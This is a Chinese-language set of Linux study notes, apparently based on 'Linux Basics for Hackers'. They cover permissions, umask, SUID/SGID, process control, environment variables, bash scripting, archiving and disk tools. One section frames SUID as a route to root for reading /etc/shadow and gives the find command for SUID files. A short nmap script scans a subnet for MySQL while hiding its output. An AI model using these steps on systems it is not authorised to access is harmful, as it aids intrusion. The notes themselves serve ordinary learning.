<p>chmod u+x, o+x hashcat.hcstat     同时为用户和其他用户（不包括组）授予执行权限</p>
<p>Linux 自动分配基本权限（通常为文件 666 和目录 777）。</p>
<p>umask 方法表示要从文件或目录的基本权限中删除 的权限，以使其更安全。 </p>
<p>当创建新文件或目录时，它权限设置为默认值减去 umask 中的值</p>
<p>与大多数 Debian 系统一样，umask 预先配置为 022，这意味着 Kali 默认值为 644，文件为 755，目录为 755。 </p>
<h3 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h3><p>umask 值对于系统上的所有用户都不是通用的。每个用户都可以为其个人.profile 文件中的文件和目录 设置个人默认 umask 值。要以用户身份登录时查看当前值，只需输入命令 umask 并记下返回的内容。要更 改用户的 umask 值，请编辑该文件/home/username/.profile，例如，添加 umask 007 进行设置，以便只有所有者和用户组的成员才具有权限。 </p>
<h3 id="特别权限："><a href="#特别权限：" class="headerlink" title="特别权限："></a>特别权限：</h3><p>设置用户 ID（或 SUID）， 设置组 ID（或 SGID）</p>
<h4 id="使用-SUID授予临时-root权限"><a href="#使用-SUID授予临时-root权限" class="headerlink" title="使用 SUID授予临时 root权限"></a>使用 SUID授予临时 root权限</h4><p>正如您现在应该知道的那样，用户只有在有权执行该特定文件时才能执行该文件。如果用户只具有读 取和（或）写入权限，则无法执行。这可能看起来很简单，但这条规则有例外。<br>你可能遇到过这样一种情况：文件在被所有用户（即使非 root 用户）执行期间都需要 root 用户的权限。 例如，允许用户更改其密码的文件需要访问/etc/shadow（Linux 中保存用户密码的文件），该文件需要 root 用户权限才能执行。在这种情况下，通过在程序上设置 SUID 位，可以临时授予所有者执行文件所需的特权。<br>基本上，SUID 位表示任何用户都可以使用所有者的权限来执行该文件，但这些权限不会超出使用该文 件的范围。<br>要设置 SUID 位，请在常规权限之前输入 4，因此当设置 SUID 位时，具有 644 的新结果权限的文件表示为 4644</p>
<h4 id="使用-SGID授予-Root用户组权限"><a href="#使用-SGID授予-Root用户组权限" class="headerlink" title="使用 SGID授予 Root用户组权限"></a>使用 SGID授予 Root用户组权限</h4><p>SGID 授予临时权限，但它授予文件所有者组的权限，而不是文件所有者的权限。这意味着，设置 SGID 位，如果用户组有权执行该文件，没有执行权限的人也可以执行文件。<br>应用于目录时，SGID 位的工作方式略有不同：当该位置位时在目录中，在该目录中创建的新文件的所有权将转到目录创建者的组，而不是文件创建者的组。当多个用户共享目录时，这非常有用。该组中的所有用户都可以执行文件，而不仅仅是单个用户。<br>SGID 位在常规权限之前表示为 2，因此当 SGID 位置位时，具有结果权限 644 的新文件将表示为 2644。<br>同样，您可以使用 chmod 命令（例如，chmod 2644 filename） 。 </p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>作为黑客，您可以使用特别权限获取临时 root 权限并执行恶意操作，例如访问/etc/shadow 中的密码。 </p>
<p>在文件系统的任何位置查找对于 root 用户或其他 sysadmin，具有权限 4000（ SUID 位）的文件。</p>
<p>find  /  -user  root  -perm  -4000</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /usr/bin </span><br><span class="line">kali &gt;ls  -l </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root  <span class="number">176272</span> Jul <span class="number">18</span> <span class="number">2018</span> stunnel4 </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root   <span class="number">26696</span> Mar <span class="number">17</span> <span class="number">2018</span> sucrack </span><br><span class="line">➊-rwsr-xr-x <span class="number">1</span>  root root  <span class="number">140944</span> Jul <span class="number">5</span>  <span class="number">2018</span> sudo</span><br></pre></td></tr></table></figure>

<p> 请注意➊，所有者的第一组权限（具有 s 代替 x）。这就是 Linux 表示 SUID 位已设置的方式。这意味着 任何人跑sudo文件具有root用户的权限，这可能是系统管理员的安全问题，也可能是黑客的潜在攻击媒介。 </p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看进程</p>
<p>USER  进程用户<br>PID   进程 id<br>%CPU  CPU 占用率<br>75<br>%MEM  进程 CPU 占用率<br>COMMAND 进程名</p>
<p>通常，要对进程执行任何操作，我们必须指定其 PID。</p>
<p>通过进程名过滤进程</p>
<p>例：    ps  aux  |  grep  msfconsole </p>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>按使用的资源排序的进程显示 ，从最大的进程开始。与 ps 命令不同的是，top 命令每 10 秒动态刷新一次列表， 而 ps 命令只提供一次进程快照。</p>
<h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><p>在运行进程时设置优先级 </p>
<p>例：nice -n  -10  /bin/slowprocess </p>
<p>高 nice 值为低优先级，低 nice 值为高优先级</p>
<p>进程的所有者可以降低进程的 优先级，但不能增加其优先级。当然，超级用户或根用户可以随意将 nice 值设置为他们喜欢的任何值。 </p>
<h3 id="renice"><a href="#renice" class="headerlink" title="renice"></a>renice</h3><p>例：renice  20  [PID]6996             </p>
<p>与 nice 一样，只有 root 用户可以将进程重新设置为负值以赋予其更高的优先级，但任何用户都可以使 用 renice 来降低优先级。 </p>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>命令：kill -signal PID</p>
<p>SIGHUP 1<br>这称为挂起（HUP）标志信号。它会停 止指定的进程并使用相同的PID重新启 动它。<br>SIGINT 2<br>这是中断（INT）信号。这是一个弱信 号，不能保证工作，但它在大多数情 况下都有效。<br>SIGQUIT 3<br>这称为核心转储。它终止进程并将进 程信息保存在内存中，然后将此信息 保存在当前工作目录中的一个名为 core 的文件中。（这样做的原因超出 了本书的范围。）<br>SIGTERM 15<br>这是终止（TERM）信号。这是 kill 命令的默认 kill 信号。<br>SIGKILL 9<br>这是强制终止信号。它通过将进程的 资源发送到特殊位置/dev/null 来强 制进程停止。<br>使</p>
<p>如果您不知道进程的 PID，则可以使用 killall 命令终止进程。此命令将进程的名称（而不是 PID）作为参 数。</p>
<h3 id="在后台运行进程"><a href="#在后台运行进程" class="headerlink" title="在后台运行进程"></a>在后台运行进程</h3><p>要在后台启动进程，只需在命令末尾添加一个与号（＆），</p>
<p>例:    leafpad  newscript  &amp; </p>
<h3 id="把后台运行的进程移到前台"><a href="#把后台运行的进程移到前台" class="headerlink" title="把后台运行的进程移到前台"></a>把后台运行的进程移到前台</h3><p>命令：fg PID</p>
<h3 id="定时执行程序"><a href="#定时执行程序" class="headerlink" title="定时执行程序"></a>定时执行程序</h3><p><strong>at</strong></p>
<p>当您使用指定的时间进入 at 守护进程时，进入交互模式时，您会看到 at&gt;提示符。您可以在此处输入 要在指定时间执行的命令： </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="keyword">at</span>  <span class="number">7</span>:<span class="number">20</span>am </span><br><span class="line"><span class="keyword">at</span> &gt;/root/myscanningscript</span><br></pre></td></tr></table></figure>

<p>at 命令是守护进程（后台进程）对于将作业安排在将来的某个时刻运行一次非常有用。</p>
<p>crond 更适合于 安排任务每天，每周或每月发生。</p>
<h3 id="管理用户环境变量"><a href="#管理用户环境变量" class="headerlink" title="管理用户环境变量"></a>管理用户环境变量</h3><p>env    查看所有默认环境变量</p>
<p>set | more     要查看所有环境变量，包括 shell 变量、本地变量和 shell 函数(如任何用户定义的变量和命令别名)</p>
<p>set | grep HISTSIZE     特定变量的过滤</p>
<p>HISTSIZE=0     暂时更改会话的变量值</p>
<p>export HISTSIZE     永久更改会话的变量值（更改后 export）</p>
<p>找点乐子：</p>
<p>​        PS1=”World’s Best Hacker: #” </p>
<p>​        export PS1 </p>
<p>PS1 变量有一组占位符，用于显示希 望在提示符中显示的信息，包括以下内容: \u  当前用户的名称 \h  主机名 \W  当前工作目录的基本名称 </p>
<h3 id="添加到PATH变量"><a href="#添加到PATH变量" class="headerlink" title="添加到PATH变量"></a>添加到PATH变量</h3><p>PATH=$PATH:/root/newhackingtool </p>
<h3 id="创建用户定义的变量"><a href="#创建用户定义的变量" class="headerlink" title="创建用户定义的变量"></a>创建用户定义的变量</h3><p>语法很简单：输入变量的名称，后面跟着赋值符号(=)，然后输入变量的值，如下所示: </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;MYNEWVARIABLE=<span class="comment">"Hacking is the most valuable skill set in the 21st century</span></span><br><span class="line">kali &gt;<span class="keyword">echo</span> $MYNEWVARIABLE </span><br><span class="line">Hacking <span class="keyword">is</span> the most valuable skill <span class="keyword">set</span> in the <span class="number">21</span><span class="keyword">st</span> century</span><br></pre></td></tr></table></figure>

<p>就像我们的系统环境变量一样，必须导出用户定义的变量才能将其持久化到新的会话中。 </p>
<p>如果要删除这个新变量或任何变量，请使用 unset 命令。不过，在删除系统变量之前一定要三思，因 为之后系统的操作可能会大不相同。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="built_in">unset</span> MYNEWVARIABLE </span><br><span class="line">kali &gt;<span class="built_in">echo</span> <span class="variable">$MYNEWVARIABLE</span> </span><br><span class="line">kali &gt;</span><br></pre></td></tr></table></figure>

<p>如您所见，当您输入 unset  MYNEWVARIABLE 时，您将删除该变量及其值。如果在同一个变量上使用 echo，Linux 现在将返回空行。</p>
<h2 id="简单BASH-脚本编程"><a href="#简单BASH-脚本编程" class="headerlink" title="简单BASH 脚本编程"></a>简单BASH 脚本编程</h2><p>#!        告诉您的操作系统您想为脚本使用哪个解释器。</p>
<p>然后按照指示的 (#!/bin/bash)操作系统使用 bash shell 解释器。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➊ <span class="comment">#! /bin/bash </span></span><br><span class="line"> </span><br><span class="line">➋ <span class="comment"># This is your second bash script. In this one, you prompt /  </span></span><br><span class="line"><span class="comment"># the user for input, place the input in a variable, and / </span></span><br><span class="line"><span class="comment"># display the variable contents in a string. </span></span><br><span class="line"> </span><br><span class="line">➌ <span class="built_in">echo</span> <span class="string">"What is your name?"</span>  </span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line">➍ <span class="built_in">echo</span> <span class="string">"What chapter are you on in Linux Basics for Hackers?"</span>  </span><br><span class="line"><span class="built_in">read</span> chapter </span><br><span class="line">➎ <span class="built_in">echo</span> <span class="string">"Welcome"</span> <span class="variable">$name</span> <span class="string">"to Chapter"</span> <span class="variable">$chapter</span> <span class="string">"of Linux Basics for Hackers!"</span></span><br></pre></td></tr></table></figure>

<p>我们从#!/bin/bash 开始，告诉系统要使用这个脚本➊bash 解释器。然后添加一个注释描述脚本➋及其 功能。之后,我们提示用户输入他们的名字，➌问解释器我们的名字，读取输入并将其转换成一个变量 name。 然后我们提示用户输入他们目前正在这本书中的所在章节，➍我们再次读取键盘输入一个变量，这个章节 叫 chapter。<br>在最后一行中，我们构造一个输出字符串，➎欢迎读者（他们的名字）在此书的所在章节。我们使用 echo 命令，并用双引号提供要在屏幕上显示的文本。然后，为了填写用户输入的名称和章号，我们将变量 添加到消息中应该出现的位置。如第 7 章所述，要使用变量中包含的值，必须在变量名前面加上$符号。<br>将此文件保存为 WelcomeScript.sh 文件。其中.sh 扩展名是脚本文件的约定。您可能已经注意到，我们 没有包含前面的扩展名，这并不是严格要求的，如果您关闭扩展名，该文件将默认保存为 shell 脚本文件。<br>现在，让我们运行这个脚本。不要忘记先用 chmod 给其执行权限</p>
<p>nmap:</p>
<p>nmap  -sT  192.168.181.1  -p  3306     对地址 192.168.181.1 执行 TCP 扫描，查看端口 3306 (MySQL 的默认端口)是否打开， </p>
<h3 id="一个简单的扫描器"><a href="#一个简单的扫描器" class="headerlink" title="一个简单的扫描器"></a>一个简单的扫描器</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➊ #! /bin/bash </span><br><span class="line">➋ # This<span class="built_in"> script </span>is designed <span class="keyword">to</span> <span class="builtin-name">find</span> hosts with MySQL installed </span><br><span class="line">nmap ➌-sT 192.168.181.0/24 ➍-p 3306 ➎&gt;/dev/<span class="literal">null</span> ➏-oG MySQLscan </span><br><span class="line">➐ cat MySQLscan | grep open &gt; MySQLscan2 ➑ </span><br><span class="line"> </span><br><span class="line">cat MySQLscan2</span><br></pre></td></tr></table></figure>

<p>➊我们使用标识符#！开始。➋让我们遵循这个注释来解释脚本的用途。<br>现在，让我们使用➌nmap 命令 TCP 扫描局域网，寻找端口 3306➍。(请注意，您的 IP 地址在您的终端 中可能不同，请使用 Linux 上的 ifconfig 命令或 Windows 上的 ipconfig 命令来确定您的 IP 地址。) 为了保持 隐秘，我们还发送通常会出现在屏幕上的标准 nmap 输出到 Linux 的一个特殊的地方➎，一个特殊的地方在 Linux 中消失。我们在本地机器上做这个，所以这并不重要，但如果要远程使用脚本，则需要隐藏 nmap 输 出。然后，我们将扫描的输出发送到一个名为 MySQLscan 的文件➏，格式为 grep 格式，这意味着 grep 可以 处理的格式。 </p>
<p>下一行显示我们存储输出的 MySQLscan 文件，➐然后输出到 grep 的管道，以过滤包含关键字 open（端 口开放）的所在行。然后我们把这些字符行放到一个命名为 MySQLscan2 的文件中➑。 </p>
<h4 id="注：这里只对bash进行简单的介绍。"><a href="#注：这里只对bash进行简单的介绍。" class="headerlink" title="注：这里只对bash进行简单的介绍。"></a>注：这里只对bash进行简单的介绍。</h4><p>内置 Bash 命令<br>命令    功能<br>：     返回 0 或 true<br>.     执行 shell 脚本<br>b     将作业放在后台<br>break     退出当前循环<br>cd     改变目录<br>continue     执行当前循环<br>echo     显示命令参数<br>eval     计算以下表达式<br>exec     在不创建新进程的情况下执行以下命令<br>exit     退出 shell<br>export     使变量或函数对其他程序可用<br>fg     将工作放在前台<br>getopts     解析 shell 脚本的参数<br>jobs     列出后台(bg)执行的工作<br>Pwd     显示当前目录<br>Read     从标准输入读取一行<br>Readonly     将变量声明为只读<br>set     列出所有变量<br>shift     将参数向左移动<br>test     评估参数<br>[     执行条件测试<br>times     打印用户和系统时间<br>trap     追踪一个信号<br>type     显示如何将每个参数解释为一个命令<br>umask     更改新文件的默认权限<br>unset     从变量或函数中删除值<br>wait     等待后台进程完成</p>
<h2 id="压缩和归档"><a href="#压缩和归档" class="headerlink" title="压缩和归档"></a>压缩和归档</h2><h3 id="归档"><a href="#归档" class="headerlink" title="归档"></a>归档</h3><p>tar  -cvf  HackersArise.tar  hackersarise1  hackersarise2  hackersarise3 </p>
<p>归档命令是 tar，我们在这里使用它有三个参数选项。c 选项表 示创建，v(代表详细过程，是可选的)列出 tar 正在处理的文件，f 表示写入以下一个文件。最后一个选项也 适用于从文件中读取。然后，我们为新归档文件提供您希望从这三个脚本来创建的文件名:HackersArise.tar。</p>
<p>tar  -tvf  HackersArise.tar         使用 tar 命令和-t 内容列表参数从 tar 包中显示这些文件，而不需要提取它们，</p>
<p>tar  -xvf  HackersArise.tar         使用 tar 命令和-x (extract)选项从 tar 包中提取这些文件</p>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>​                        </p>
<table>
<thead>
<tr>
<th>压缩方式</th>
<th>压缩文件</th>
<th>解压文件</th>
</tr>
</thead>
<tbody><tr>
<td>• bzip2，它使用扩展名.tar.bz2</td>
<td>bzip2  HackersArise.*</td>
<td>bunzip2  HackersArise.*</td>
</tr>
<tr>
<td>• compress，它使用扩展名.tar.Z</td>
<td>compress  HackersArise.*</td>
<td>uncompress  HackersArise.*</td>
</tr>
<tr>
<td>• gzip，它使用扩展名.tar.gz 或.tgz</td>
<td>gzip  HackersArise.*</td>
<td>gunzip  HackersArise.*</td>
</tr>
</tbody></table>
<h3 id="创建存储设备的逐位或物理副本"><a href="#创建存储设备的逐位或物理副本" class="headerlink" title="创建存储设备的逐位或物理副本"></a>创建存储设备的逐位或物理副本</h3><p>dd 命令的基本语法如下: </p>
<p>dd if=inputfile of=outputfile </p>
<p>dd 是指定输入文件的物理“复制”命令，</p>
<p>/dev/sdb 表示指定输出文件的/dev 目录下的闪存驱动器，</p>
<p>/root/flashcopy 是要将物理副本复制到的文件的名称</p>
<p>dd  if=/dev/media  of=/root/flashcopy  bs=4096  conv:noerror</p>
<p>dd 命令可以使用许多参数选项，您可以对这些选项进行一些研究，但其中最有用的是 noerror 选项和 bs(块大小)选项。顾名思义，即使遇到错误，noerror 选项也会继续复制。bs 选项允许您确定要复制的数 据的块大小(每个块的读/写字节数)。默认情况下，它被设置为 512 字节，但是可以更改它以加快进度。通 常，这将设置为设备的扇区大小，通常为 4KB(4096 字节)。</p>
<h2 id="文件系统和存储设备管理"><a href="#文件系统和存储设备管理" class="headerlink" title="文件系统和存储设备管理"></a>文件系统和存储设备管理</h2><h3 id="设备目录-DEV"><a href="#设备目录-DEV" class="headerlink" title="设备目录/DEV"></a>设备目录/DEV</h3><p>Linux 有一个特殊的目录，其中包含代表每个附加设备的文件：适当命名的/dev 目录。</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /dev </span><br><span class="line">kali &gt;ls  -l total<span class="number"> 0 </span></span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,175 May<span class="number"> 16 </span>12:44 agpgart </span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,235 May<span class="number"> 16 </span>12:44 autofs </span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span> root root<span class="number"> 160 </span>May<span class="number"> 16 </span>12:44 block </span><br><span class="line">­­snip-- </span><br><span class="line">lrwxrwxrwx  <span class="number"> 1 </span> root root<span class="number"> 3 </span>May<span class="number"> 16 </span>12:44 cdrom -&gt; sr0 </span><br><span class="line">­­snip-- </span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span> root root<span class="number"> 60 </span>May<span class="number"> 16 </span>12:44 cpu </span><br><span class="line">­­snip--</span><br></pre></td></tr></table></figure>

<p>使用带有 fdisk 的-l 参数列出所有驱动器的所有分区，</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fdisk  -l </span><br><span class="line">Disk /dev/sda: 20GiB,<span class="number"> 21474836480 </span>bytes,<span class="number"> 41943040 </span>sectors  </span><br><span class="line">108 </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes </span><br><span class="line">  </span><br><span class="line">Disk label type: dos </span><br><span class="line">Disk identifier: 0x7c06cd70 </span><br><span class="line"> </span><br><span class="line">Device Boot Start End   Sectors Size Id Type </span><br><span class="line">/dev/sda1 *<span class="number"> 2048 </span>39174143<span class="number"> 39172096 </span>18.7G<span class="number"> 83 </span>Linux </span><br><span class="line">/dev/sda2<span class="number"> 39176190 </span><span class="number"> 41940991 </span> <span class="number"> 2764802 </span>1.3G<span class="number"> 5 </span>Extended </span><br><span class="line">/dev/sda5<span class="number"> 39176192 </span><span class="number"> 41940991 </span> <span class="number"> 2764800 </span>1.3G<span class="number"> 82 </span>Linux swap / Solaris </span><br><span class="line"> </span><br><span class="line">Disk /dev/sdb: 29.8 GiB,<span class="number"> 31999393792 </span>bytes,<span class="number"> 62498816 </span>sectors </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes Disk label type: dos </span><br><span class="line">Disk identifier: 0xc3072e18 </span><br><span class="line"> </span><br><span class="line">Device Boot  Start End Sectors Size Id Type </span><br><span class="line">/dev/sdb1<span class="number"> 32 </span>62498815<span class="number"> 62498784 </span>29.8G<span class="number"> 7 </span>HPFS/NTFS/exFAT</span><br></pre></td></tr></table></figure>

<p>设备 sda1、sda2 和 sda5 在第一节中列出。这三种设备构成了我的虚拟机的虚拟磁 盘，它是一个 20GB 的驱动器，有三个分区，包括交换分区(sda5)，当 RAM 容量超过时，它充当虚拟 RAM —类似于 Windows 中的虚拟页面文件。<br>向下扫描到第三节，您将看到指定为 sdb -的第二个设备输出，b 标签告诉我们这个驱 动器与前三个设备是分开的。这是我的 64GB 闪存。注意，fdisk 表示它是 HPFS/NTFS/ExFAT 文件系统类型。 这些文件类型——高性能文件系统(HPFS)、新技术文件系统(NTFS)和扩展文件分配表(exFAT)——不是 Linux 系统的本机文件，而是 macOS 和 Windows 系统的。在进行研究时，能够识别不同系统的原生文件类型是值 得的。文件系统可能指出驱动器的格式设置在哪种机器上，这是有价值的信息。Kali 能够使用在许多不同操 作系统上创建的 USB 闪存驱动器。<br>正如您在第 1 章中看到的，Linux 文件系统的结构与 Windows 和其他专有操作系统有很大的不同。最重 要的是，Linux 中文件的存储和管理方式也不同。新版本的 Windows 使用 NTFS 文件系统，而旧的 Windows<br>109<br>系统使用文件分配表(FAT)系统。<br>Linux 使用许多不同类型的文件系统，但最常见的是 ext2、ext3 和 ext4。这些都是 ext(或扩展的)文件系 统的升级版，ext4 是最新的。 </p>
<h3 id="字符和块设备"><a href="#字符和块设备" class="headerlink" title="字符和块设备"></a>字符和块设备</h3><p>关于/dev 目录中设备文件的命名，还需要注意的是，第一个位置包含 c 或 b。您可以在清单 10-1 的大 多数条目开头看到这一点，它看起来像这样: </p>
<p>这些字母代表设备输入和输出数据的两种方式。c 代表字符，如您所料，这些设备被称为字符设备。通 过逐个字符(如鼠标或键盘)发送和接收数据与系统交互的外部设备是字符设备。 </p>
<p>b 代表第二种类型:块设备。它们以数据块(一次多个字节)进行通信，包括硬盘驱动器和 DVD 驱动器等 设备。这些设备需要更高的数据吞吐量，因此以块(一次多个字符或字节)的形式发送和接收数据。一旦您知 道一个设备是字符设备还是块设备，您就可以轻松地获得关于它的更多信息。</p>
<h3 id="使用-lsblk列出-块设备和信息"><a href="#使用-lsblk列出-块设备和信息" class="headerlink" title="使用 lsblk列出 块设备和信息"></a>使用 lsblk列出 块设备和信息</h3><p>Linux 命令 lsblk (list block 的缩写)列出/dev 中列出的每个块设备的一些基本信息。结果类似于 fdisk -l 的输出，但它也将在一种树型结构中显示具有多个分区的设备，将每个设备的分区显示为分支，并且不需 要运行根特权。例如，在清单 10-3 中，我们看到了 sda 及其分支 sda1、sda2 和 sda5。 </p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;lsblk </span><br><span class="line">Name MAJ:MIN RM SIZE RO TYPE MOUNTPOINT </span><br><span class="line">fd0 2:0<span class="number"> 1 </span>4K<span class="number"> 0 </span>disk </span><br><span class="line">sda1 8:0<span class="number"> 0 </span>20G<span class="number"> 0 </span>disk </span><br><span class="line">|-sda1 8:1<span class="number"> 0 </span>18.7G<span class="number"> 0 </span>part / </span><br><span class="line">|-sda2 8:2<span class="number"> 0 </span>1K<span class="number"> 0 </span>part </span><br><span class="line">|-sda5 8:5<span class="number"> 0 </span>1.3G<span class="number"> 0 </span>part [SWAP] </span><br><span class="line"></span><br><span class="line">sdb 8:16<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk </span><br><span class="line">|-sdb1 8.17<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk /media </span><br><span class="line">sr0 11:0<span class="number"> 1 </span>2.7G<span class="number"> 0 </span>rom</span><br></pre></td></tr></table></figure>

<p>输出包括软盘驱动器作为 fd0, DVD 驱动器作为 sr0，尽管我的系统上没有软盘驱动器，这只是旧系统的 遗留。我们还可以在驱动器的挂载点上看到信息——这是驱动器附加到文件系统的位置。请注意，硬盘驱 动器 sda1 安装在/目录和闪存驱动器安装在/media 目录。</p>
<h3 id="自己安装存储设备"><a href="#自己安装存储设备" class="headerlink" title="自己安装存储设备"></a>自己安装存储设备</h3><p>mount  /dev/sdb1  /mnt         将新硬盘 sdb1 挂载到/mnt 目录</p>
<h3 id="卸载与-umount"><a href="#卸载与-umount" class="headerlink" title="卸载与 umount"></a>卸载与 umount</h3><p>umount  /dev/sdb1 </p>
<h3 id="获取挂载磁盘上的信息"><a href="#获取挂载磁盘上的信息" class="headerlink" title="获取挂载磁盘上的信息"></a>获取挂载磁盘上的信息</h3><p>命令 df(对于空余磁盘)将为我们提供关于任何硬盘或挂载设备(如 CD、DVD 和闪存驱动器)的基本信息， 包括正在使用的空间和可用空间(参见清单 10-4)。如果没有任何选项，df 默认为系统上的第一个驱动器(在 本例中是 sda)。如果您想检查另一个驱动器，只需使用您想检查的驱动器表示形式(例如，df sdb)遵循 df 命 令即可。 </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;df  </span><br><span class="line">Filesystem <span class="number">1</span>K-Blocks Used Available Use% Mounted on </span><br><span class="line">rootfs <span class="number">19620732</span>    <span class="number">17096196</span> <span class="number">1504788</span> <span class="number">92</span>% / </span><br><span class="line">udev  <span class="number">10240</span> <span class="number">0</span> <span class="number">10240</span>   <span class="number">0</span>% /dev  </span><br><span class="line">­­snip--   </span><br><span class="line"> </span><br><span class="line">/dev/sdb1 <span class="number">29823024</span>  <span class="number">29712544</span> <span class="number">110480</span>  <span class="number">99</span>% /media/USB3<span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>这里的第一行输出我们得到的信息显示类别标题，磁盘空间以 1KB 块的形式给出。在第二行，我们看 到 rootfs 有 19,620,732 个 1 千字节的块，其中使用了 17,096,196 个块(约占 92%)，剩下 1,504,788 个可用。 df 命令还告诉我们这个文件系统安装在文件系统/根目录。<br>在最后一行，你可以看到我的 u 盘。注意，它被指定为/dev/sdb1，几乎 100%已满，挂载在/media/USB3.0。<br>综上所述，我在这个系统上的虚拟磁盘被指定为 sda1，它的信息如下:<br>sd SATA 硬盘<br>一个硬盘驱动器<br>驱动器上的第一个分区 </p>
<p>我的 64GB 闪存驱动器指定为 sdb1，我的外部驱动器指定为 sdc1</p>
<h3 id="检查错误"><a href="#检查错误" class="headerlink" title="检查错误"></a>检查错误</h3><p>fsck 命令(文件系统检查的缩写)检查文件系统的错误并修复损坏(如果可能的话)，或者将错误区域放入 一个错误块表中，将其标记为错误。要运行 fsck 命令，需要指定文件系统类型(默认为 ext2)和要检查的设 备文件。重要的是，在运行文件系统检查之前，必须卸载驱动器。</p>
<p>因此，执行文件系统检查的第一步是卸载设备。</p>
<p>kali &gt;umount  /dev/sdb1 </p>
<p>我可以添加-p 选项，让 fsck 自动修复</p>
<p>kali &gt;fsck  -p  /dev/sdb1 </p>
<p>在设备卸载后，我现在可以检查设备的任何坏扇区或其他问题，如下: </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fsck  -p  /dev/sdb1  </span><br><span class="line">fsck <span class="keyword">from</span> util-linux 2.30.2  </span><br><span class="line">exfatfsck 1.2.7 </span><br><span class="line">Checking file<span class="built_in"> system </span>on /dev/sdb1.  </span><br><span class="line">File<span class="built_in"> system </span>version 1.0 </span><br><span class="line">Sector size 512 bytes </span><br><span class="line">Cluster size 32 KB </span><br><span class="line">Volume size 7648 MB </span><br><span class="line">Used space 1265 MB </span><br><span class="line">Available space 6383 MB  </span><br><span class="line">Totally 20 directories <span class="keyword">and</span> 111 files. </span><br><span class="line">File<span class="built_in"> system </span>checking finished. <span class="literal">No</span> errors 